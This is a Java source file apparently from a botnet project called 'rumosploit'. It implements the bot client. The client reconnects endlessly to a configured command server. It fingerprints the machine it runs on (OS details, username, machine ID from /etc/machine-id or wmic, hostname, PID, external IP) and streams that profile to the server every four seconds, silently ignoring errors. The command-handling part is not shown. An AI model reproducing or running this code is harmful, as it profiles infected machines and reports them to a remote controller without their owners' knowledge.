package com.github.rumoel.rumosploit.bot;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.invoke.MethodHandles;
import java.lang.management.ManagementFactory;
import java.net.InetSocketAddress;
import java.nio.file.Files;

import org.apache.mina.core.future.ConnectFuture;
import org.apache.mina.core.session.IdleStatus;
import org.apache.mina.filter.codec.ProtocolCodecFilter;
import org.apache.mina.filter.codec.serialization.ObjectSerializationCodecFactory;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.dataformat.yaml.YAMLFactory;
import com.github.rumoel.rumosploit.bot.header.Header;
import com.github.rumoel.rumosploit.bot.network.packet.ReadyPacket;
import com.github.rumoel.rumosploit.utils.ExternalDataGetter;

public class Bot extends Thread {

	static Logger logger = LoggerFactory.getLogger(MethodHandles.lookup().lookupClass());

	public void readConfig() throws IOException {
		ObjectMapper mapper = new ObjectMapper(new YAMLFactory());
		InputStream configStream = getClass().getClassLoader().getResource("bconfig.yml").openStream();
		Header.setConfig(mapper.readValue(configStream, BotConfig.class));
	}

	public void initNetwork() {
		ObjectSerializationCodecFactory oscf = new ObjectSerializationCodecFactory();
		oscf.setDecoderMaxObjectSize(Integer.MAX_VALUE);
		Header.getNioSocketConnector().setHandler(Header.getHandler());
		Header.getNioSocketConnector().getFilterChain().addLast("codec", new ProtocolCodecFilter(oscf));
		Header.getNioSocketConnector().getSessionConfig().setIdleTime(IdleStatus.BOTH_IDLE, 10);
	}

	@Override
	public void run() {
		try {
			reconnect();
		} catch (Exception e) {
			e.printStackTrace();
		}

		startThreads();

	}

	private void startThreads() {
		startDataGetter();

		startIpGetter();

		startDataSender();
	}

	private void startIpGetter() {
		new Thread(() -> {
			do {
				try {
					String ip = ExternalDataGetter.getExternalIP();
					if (ip != null) {
						Header.setExternalIP(ip);
					}
				} catch (Exception e1) {
					// IGNORE
				}
				try {
					Thread.sleep(300000);
				} catch (Exception e2) {
					// IGNORE
				}
			} while (true);

		}, "externalIpGetter").start();
	}

	private void startDataGetter() {
		new Thread(() -> {
			do {
				try {
					setBotEntityData();
				} catch (Exception e) {
					e.printStackTrace();
				}
				try {
					Thread.sleep(3000);
				} catch (Exception e) {
					e.printStackTrace();
				}
			} while (true);
		}, "OsdataGetter").start();
	}

	public void setBotEntityData() throws IOException {
		BotEntity data = Header.getBotEntity();

		// OS
		data.setOsName(System.getProperty("os.name"));
		data.setOsVersion(System.getProperty("os.version"));
		data.setOsArch(System.getProperty("os.arch"));

		// user
		data.setOsUserName(System.getProperty("user.name"));

		if (data.getMachineId() == null) {
			// HARD
			data.setMachineId(readID());
			String pidHostName = ManagementFactory.getRuntimeMXBean().getName();
			data.setHostName(pidHostName.split("@")[1]);

			// PROCESS
			int pid = Integer.parseInt(pidHostName.split("@")[0]);
			data.setPid(pid);
		}
		data.setExternalIP(Header.getExternalIP());

		data.setBotId(data.getMachineId() + ":" + data.getOsUserName() + ":" + data.getPid());
	}

	private String readID() throws IOException {
		try {
			File file1 = new File(new File(new File("/"), "etc"), "machine-id");
			String string1 = Files.readAllLines(file1.toPath()).get(0);
			if (!string1.isEmpty()) {
				return string1;
			}
		} catch (Exception e) {
			// IGNORE (try other)
		}

		// by process
		try {
			String id = null;
			ProcessBuilder processBuilder = new ProcessBuilder("wmic", "csproduct", "get", "UUID");

			Process process = processBuilder.start();
			try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
				String line;
				while ((line = reader.readLine()) != null) {
					if (line.length() == 38 && !line.contains("UUID")) {
						id = line.trim();
						break;
					}
				}
			}
			return id;
		} catch (Exception e) {
			// IGNORE (try other)
		}
		// by process
		return null;
	}

	private void startDataSender() {
		new Thread(() -> {
			do {
				BotEntity data = Header.getBotEntity();
				if (data.botId != null) {
					Header.getSession().write(data);
				}
				try {
					Thread.sleep(4000);
				} catch (Exception e) {
					e.printStackTrace();
				}
			} while (true);
		}, "dataSender").start();
	}

	public void reconnect() throws InterruptedException {
		if (Header.getConfig().isDebug()) {
			logger.warn("reconnect");
		}

		for (;;) {
			try {
				connect();
				break;
			} catch (org.apache.mina.core.RuntimeIoException e) {
				e.getClass();// IGNORE
			} catch (Exception e) {
				e.printStackTrace();
				if (Header.getConfig().isDebug()) {
					logger.error("Failed to connect.[{}] by {}", e.getMessage(), e.getCause().getMessage());
				}
				Thread.sleep(5000);
			}
		}
	}

	private void connect() {
		if (Header.getConfig().isDebug()) {
			logger.warn("connect");
		}
		String host = Header.getConfig().getHost();
		int port = Header.getConfig().getPort();
		ConnectFuture future = Header.getNioSocketConnector().connect(new InetSocketAddress(host, port));
		future.awaitUninterruptibly();
		Header.setSession(future.getSession());

		ReadyPacket ready = new ReadyPacket();
		Header.getSession().write(ready);
	}

	public void reload() {
		throw new UnsupportedOperationException();
	}

	public void restart() {
		throw new UnsupportedOperationException();

	}

	public void stopF() {
		throw new UnsupportedOperationException();
	}

}
